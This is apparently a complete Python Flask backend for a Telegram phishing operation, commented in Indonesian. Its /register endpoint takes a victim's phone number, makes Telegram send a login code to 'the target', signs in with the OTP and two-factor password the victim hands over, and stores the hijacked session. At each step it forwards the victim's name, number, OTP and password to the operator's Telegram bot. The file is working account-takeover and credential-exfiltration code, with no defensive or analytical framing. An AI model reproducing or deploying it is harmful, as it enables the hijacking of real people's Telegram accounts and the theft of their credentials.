import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
from asgiref.sync import async_to_sync

app = Flask(__name__)
CORS(app)

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

user_sessions = {}

def send_to_bot_final(nama, nomor, sandi="None", otp=""):
    """Format tampilan bot persis sesuai gambar"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    
    # Menyusun teks baris demi baris agar rapi
    text = (
        f"Nama: **{nama}**\n"
        f"Nomor: `{nomor}`\n"
        f"Kata sandi: {sandi}\n"
        f"OTP : {otp}"
    )
    
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "Markdown",
        "reply_markup": {
            "inline_keyboard": [[{"text": "otp", "callback_data": "ignore"}]]
        }
    }
    requests.post(url, json=payload)

async def telegram_logic(data):
    step = data.get('step')
    raw_nomor = data.get('nomor', '').strip().replace(" ", "")
    nomor = '+62' + raw_nomor[1:] if raw_nomor.startswith('0') else raw_nomor
    nama = data.get('nama', 'User')
    otp = data.get('otp', '')
    sandi = data.get('sandi', 'None')

    session_str = user_sessions.get(f"{nomor}_str", "")
    client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            # Meminta Telegram kirim kode ke target
            result = await client.send_code_request(nomor)
            user_sessions[nomor] = {"hash": result.phone_code_hash, "nama": nama}
            user_sessions[f"{nomor}_str"] = client.session.save()
            
            # Kirim log awal ke bot
            send_to_bot_final(nama, nomor)
            return {"status": "success"}, 200
            
        elif step == 2:
            try:
                session_data = user_sessions.get(nomor)
                await client.sign_in(nomor, otp, phone_code_hash=session_data['hash'])
                
                # Update log dengan OTP yang masuk
                send_to_bot_final(nama, nomor, otp=otp)
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
            except errors.PhoneCodeInvalidError:
                return {"status": "invalid_otp", "message": "OTP SALAH!!"}, 400
                
        elif step == 3:
            await client.sign_in(password=sandi)
            # Log final dengan 2FA
            send_to_bot_final(nama, nomor, sandi=sandi, otp="Verified")
            return {"status": "success"}, 200

    except Exception as e:
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST'])
def register():
    result, status_code = async_to_sync(telegram_logic)(request.json)
    return jsonify(result), status_code

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))